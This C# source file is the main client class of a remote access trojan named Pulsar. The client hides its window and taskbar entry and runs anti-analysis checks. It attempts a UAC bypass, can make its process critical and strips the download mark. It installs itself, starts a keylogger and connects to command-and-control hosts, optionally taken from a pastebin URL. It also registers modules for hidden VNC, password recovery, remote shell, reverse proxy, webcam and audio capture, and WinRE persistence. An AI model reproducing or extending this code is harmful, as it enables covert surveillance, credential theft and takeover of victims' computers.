using Pulsar.Client.Anti;
using Pulsar.Client.Config;
using Pulsar.Client.GUI;
using Pulsar.Client.Helper.UAC;
using Pulsar.Client.Logging;
using Pulsar.Client.LoggingAPI;
using Pulsar.Client.Messages;
using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.User;
using Pulsar.Client.Utilities;
using Pulsar.Common.DNS;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.UAC;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class PulsarApplication : Form
    {
        /// <summary>
        /// Static reference to the current application instance.
        /// </summary>
        public static PulsarApplication Instance { get; private set; }

        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private PulsarClient _connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;

        /// <summary>
        /// The background keylogger service used to capture and store keystrokes.
        /// </summary>
        private KeyloggerService _keyloggerService;

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection _userActivityDetection;

        private ActiveWindowChecker _activeWindowChecker;
        private ClipboardChecker _clipboardChecker;
        private DebugLog _debugLog;

        private bool _deferredProcessorsRegistered;

        private static readonly string[] SharpDxAssemblies =
        {
            "SharpDX",
            "SharpDX.Direct3D11",
            "SharpDX.Direct2D1",
            "SharpDX.DXGI",
            "SharpDX.D3DCompiler",
            "SharpDX.Mathematics"
        };

        private static readonly string[] WebcamAssemblies =
        {
            "AForge",
            "AForge.Video",
            "AForge.Video.DirectShow"
        };

        private static readonly string[] AudioAssemblies =
        {
            "NAudio.Core",
            "NAudio.Wasapi",
            "NAudio.WinForms",
            "NAudio.WinMM"
        };

        /// <summary>
        /// Gets the clipboard checker instance.
        /// </summary>
        public ClipboardChecker ClipboardChecker => _clipboardChecker;

        /// <summary>
        /// Determines whether an installation is required depending on the current and target paths.
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// Optional tray icon with status window, only present when built with the "Client GUI" flag.
        /// </summary>
        private readonly ClientTrayIcon _trayIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="PulsarApplication"/> class.
        /// </summary>
        public PulsarApplication()
        {
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
            try
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: Start\r\n"); } catch { }
                Instance = this;
                _messageProcessors = new List<IMessageProcessor>();
                _notifyIcon = new NotifyIcon();
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: NotifyIcon created\r\n"); } catch { }

                if (Settings.SHOWCLIENTGUI)
                {
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: Creating ClientTrayIcon\r\n"); } catch { }
                    _trayIcon = new ClientTrayIcon(this);
                }
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: Complete\r\n"); } catch { }
            }
            catch (Exception ex)
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
                throw;
            }
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
            try
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: Start\r\n"); } catch { }
                Visible = false;
                ShowInTaskbar = false;
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: Calling Run()\r\n"); } catch { }
                Run();
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: Run() returned\r\n"); } catch { }
                base.OnLoad(e);
            }
            catch (Exception ex)
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
                throw;
            }
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            string logMainFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
            string logInitFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_init.log");
            
            try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Start\r\n"); } catch { }
            
            try
            {
                // decrypt and verify the settings
                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Settings.Initialize()\r\n"); } catch { }
                if (!Settings.Initialize())
                {
                    try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Settings.Initialize() returned false - exit(1)\r\n"); } catch { }
                    Environment.Exit(1);
                }
                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Settings.Initialize() SUCCESS\r\n"); } catch { }

                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: DeferredAssemblyManager.Initialize()\r\n"); } catch { }
                DeferredAssemblyManager.Initialize();

                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Creating mutex\r\n"); } catch { }
                ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

                // check if process with same mutex is already running on system
                if (!ApplicationMutex.CreatedNew)
                    Environment.Exit(2);

                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Manager.StartAnti()\r\n"); } catch { }
                Manager.StartAnti();

                if (Settings.UACBYPASS && !UAC.IsAdministrator())
                {
                    Debug.WriteLine("Attempting UAC bypass...");
                    Bypass.DoUacBypass();
                    Environment.Exit(5);
                }

                if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
                {
                    Debug.WriteLine("Setting process as critical...");
                    NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
                }

                FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

                var installer = new ClientInstaller();

                if (IsInstallationRequired)
                {
                    // close mutex before installing the client
                    ApplicationMutex.Dispose();

                    try
                    {
                        installer.Install();
                        Environment.Exit(3);
                    }
                    catch (Exception e)
                    {
                        Debug.WriteLine(e);
                    }
                }
                else
                {
                    try
                    {
                        // (re)apply settings and proceed with connect loop
                        installer.ApplySettings();
                    }
                    catch (Exception e)
                    {
                        Debug.WriteLine(e);
                    }

                    if (Settings.ENABLELOGGER)
                    {
                        DeferredAssemblyManager.RunWhenAvailable(
                            new[] { "Gma.System.MouseKeyHook" },
                            () =>
                            {
                                try
                                {
                                    if (_keyloggerService != null)
                                    {
                                        return;
                                    }

                                    if (!DeferredAssemblyManager.TryEnsureAssembliesLoaded("Gma.System.MouseKeyHook"))
                                    {
                                        Debug.WriteLine("Keylogger dependencies not yet available; deferring start.");
                                        return;
                                    }

                                    _keyloggerService = new KeyloggerService();
                                    _keyloggerService.Start();
                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Failed to start keylogger: {ex.Message}");
                                }
                            });
                    }

                    try
                    {
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Start\r\n"); } catch { }
                        
                        PulsarClient client;
                        string hosts = Settings.HOSTS;
                        
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: HOSTS=\"{hosts}\"\r\n"); } catch { }

                        if (Settings.PASTEBIN && 
                            (hosts.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || 
                             hosts.StartsWith("https://", StringComparison.OrdinalIgnoreCase)))
                        {
                            Debug.WriteLine("Using pastebin mode with URL: " + hosts);
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Pastebin mode\r\n"); } catch { }
                            var hostsManager = new HostsManager(hosts);
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Creating PulsarClient (pastebin)\r\n"); } catch { }
                            client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: PulsarClient created (pastebin)\r\n"); } catch { }
                        }
                        else
                        {
                            Debug.WriteLine("Using standard host list mode");
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Standard mode - parsing hosts\r\n"); } catch { }
                            var hostsList = new HostsConverter().RawHostsToList(hosts);
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Parsed {hostsList.Count} hosts\r\n"); } catch { }
                            foreach (var h in hostsList)
                            {
                                try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   - {h.Hostname}:{h.Port}\r\n"); } catch { }
                            }
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Creating HostsManager\r\n"); } catch { }
                            var hostsManager = new HostsManager(hostsList);
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Creating PulsarClient\r\n"); } catch { }
                            client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: PulsarClient created\r\n"); } catch { }
                        }

                        _connectClient = client;
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Subscribing to ClientState\r\n"); } catch { }
                        _connectClient.ClientState += ConnectClientOnClientState;
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: InitializeMessageProcessors\r\n"); } catch { }
                        InitializeMessageProcessors(_connectClient);

                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: ActivityDetection\r\n"); } catch { }
                        _userActivityDetection = new ActivityDetection(_connectClient);
                        _userActivityDetection.Start();

                        _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                        _clipboardChecker = new ClipboardChecker(_connectClient);
                        UniversalDebugLogger.Initialize(_connectClient);
                        _debugLog = new DebugLog();
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Starting ConnectLoop thread\r\n"); } catch { }

                        new Thread(() =>
                        {
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CONNECTLOOP: Thread start\r\n"); } catch { }
                            // Start connection loop on new thread and dispose application once client exits.
                            // This is required to keep the UI thread responsive and run the message loop.
                            _connectClient.ConnectLoop();
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CONNECTLOOP: Exited\r\n"); } catch { }
                            Environment.Exit(0);
                        }).Start();
                    }
                    catch (Exception ex)
                    {
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Stack: {ex.StackTrace}\r\n"); } catch { }
                        if (ex.InnerException != null)
                        {
                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Inner: {ex.InnerException.GetType().Name}: {ex.InnerException.Message}\r\n"); } catch { }
                        }
                        Environment.Exit(7);
                    }
                }
            }
            catch (Exception ex)
            {
                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: OUTER EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Stack: {ex.StackTrace}\r\n"); } catch { }
                Environment.Exit(97);
            }
        }

        [System.Runtime.CompilerServices.MethodImpl(
    System.Runtime.CompilerServices.MethodImplOptions.NoInlining |
    System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            _trayIcon?.SetConnectionState(connected);

            if (connected)
            {
                _notifyIcon.Text = "Pulsar Client\nConnection established";
                // NOTE: SetUserActiveWindowStatus will be sent by PulsarClient.OnClientRead() 
                // after identification succeeds, not here during connection handshake
            }
            else
                _notifyIcon.Text = "Pulsar Client\nNo connection";
        }

        /// <summary>
        /// Gets the title of the currently active window.
        /// </summary>
        /// <returns>The title of the active window.</returns>
        private string GetCurrentWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = NativeMethods.GetForegroundWindow();

            if (NativeMethods.GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }

        /// <summary>
        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(PulsarClient client)
        {
            RegisterProcessor(new DeferredAssemblyHandler());
            RegisterProcessor(new CommandHandler());

            RegisterProcessor(new PreviewHandler());
            RegisterProcessor(new PingHandler());
            RegisterProcessor(new QuickCommandHandler());
            RegisterProcessor(new HVNCHandler());
            RegisterProcessor(new ClientServicesHandler(this, client));
            RegisterProcessor(new FileManagerHandler(client));
            RegisterProcessor(new KeyloggerHandler());
            RegisterProcessor(new MessageBoxHandler());
            RegisterProcessor(new ClipboardHandler());
            RegisterProcessor(new FunStuffHandler());
            RegisterProcessor(new PasswordRecoveryHandler());
            RegisterProcessor(new QueryHandler());
            RegisterProcessor(new RegistryHandler());
            RegisterProcessor(new RemoteShellHandler(client));
            RegisterProcessor(new ReverseProxyHandler(client));
            RegisterProcessor(new ShutdownHandler());
            RegisterProcessor(new StartupManagerHandler());
            RegisterProcessor(new SystemInformationHandler());
            RegisterProcessor(new TaskManagerHandler(client));
            RegisterProcessor(new TcpConnectionsHandler());
            RegisterProcessor(new WebsiteVisitorHandler());
            RegisterProcessor(new RemoteScriptingHandler());
            RegisterProcessor(new RemoteChatHandler());
            RegisterProcessor(new WinREPersistenceHandler());

            ScheduleDeferredMessageProcessors(client);
        }

        private void RegisterProcessor(IMessageProcessor processor)
        {
            if (processor == null)
            {
                return;
            }

            bool shouldRegister;
            lock (_messageProcessors)
            {
                shouldRegister = !_messageProcessors.Contains(processor);
                if (shouldRegister)
                {
                    _messageProcessors.Add(processor);
                }
            }

            if (shouldRegister)
            {
                MessageHandler.Register(processor);
            }
        }

        private void ScheduleDeferredMessageProcessors(PulsarClient client)
        {
            DeferredAssemblyManager.RunWhenAvailable(
                DeferredAssemblyManager.SecondaryAssemblies,
                () =>
                {
                    Action registerAction = () => RegisterDeferredMessageProcessors(client);

                    try
                    {
                        if (InvokeRequired)
                        {
                            BeginInvoke((Action)registerAction);
                        }
                        else
                        {
                            registerAction();
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to schedule deferred message processors: {ex.Message}");
                    }
                });
        }

        private void RegisterDeferredMessageProcessors(PulsarClient client)
        {
            if (_deferredProcessorsRegistered)
            {
                return;
            }

            _deferredProcessorsRegistered = true;

            try
            {
                DeferredAssemblyManager.TryEnsureAssembliesLoaded(SharpDxAssemblies);
                DeferredAssemblyManager.TryEnsureAssembliesLoaded(WebcamAssemblies);
                DeferredAssemblyManager.TryEnsureAssembliesLoaded(AudioAssemblies);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Deferred assembly load error: {ex.Message}");
            }

            RegisterProcessor(new RemoteDesktopHandler());
            RegisterProcessor(new RemoteWebcamHandler());
            RegisterProcessor(new AudioHandler());
            RegisterProcessor(new AudioOutputHandler());
        }

        /// <summary>
        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            List<IMessageProcessor> processorsCopy;

            lock (_messageProcessors)
            {
                processorsCopy = new List<IMessageProcessor>(_messageProcessors);
                _messageProcessors.Clear();
            }

            foreach (var msgProc in processorsCopy)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is IDisposable disposableMsgProc)
                {
                    disposableMsgProc.Dispose();
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _keyloggerService?.Dispose();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
                _trayIcon?.Dispose();
                _debugLog?.Dispose(); // Dispose DebugLog
            }
            base.Dispose(disposing);
        }
    }
}
